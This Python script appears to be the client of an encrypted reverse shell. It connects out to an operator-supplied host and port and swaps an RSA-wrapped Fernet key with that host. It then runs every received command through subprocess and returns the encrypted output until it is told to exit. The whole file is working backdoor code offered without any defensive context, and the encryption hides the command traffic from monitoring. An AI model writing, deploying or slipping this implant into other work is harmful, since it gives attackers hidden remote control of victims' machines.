import socket
import sys
import subprocess as sub 
from cryptography.fernet import Fernet
import argparse
from cryptography.hazmat.primitives.asymmetric import rsa 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes

serverAddr = sys.argv[2]
serverPort = int(sys.argv[4])

if __name__ == "__main__":
	clientSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	clientSock.connect((serverAddr,serverPort))

	clientSock.send(b"Send me a pem")
	pem = clientSock.recv(4096)
	publicKey = serialization.load_pem_public_key(pem)
	symmetricKey = Fernet.generate_key()
	fernet = Fernet(symmetricKey)
	encryptedSymmetricKey = publicKey.encrypt(
		symmetricKey,
		padding.OAEP(
			mgf = padding.MGF1(algorithm = hashes.SHA256()),
			algorithm = hashes.SHA256(),
			label = None
			)
		)
	clientSock.send(encryptedSymmetricKey)

	while True:
		command = clientSock.recv(4096)
		command = fernet.decrypt(command)
		command = command.decode()
		if command == "exit":
			break
		else:
			proc = sub.Popen(command.split(" "),stdout = sub.PIPE,stderr = sub.PIPE)
			result, err = proc.communicate()
			#result = result.encode()
			result = fernet.encrypt(result)
			clientSock.send(result)

	clientSock.close()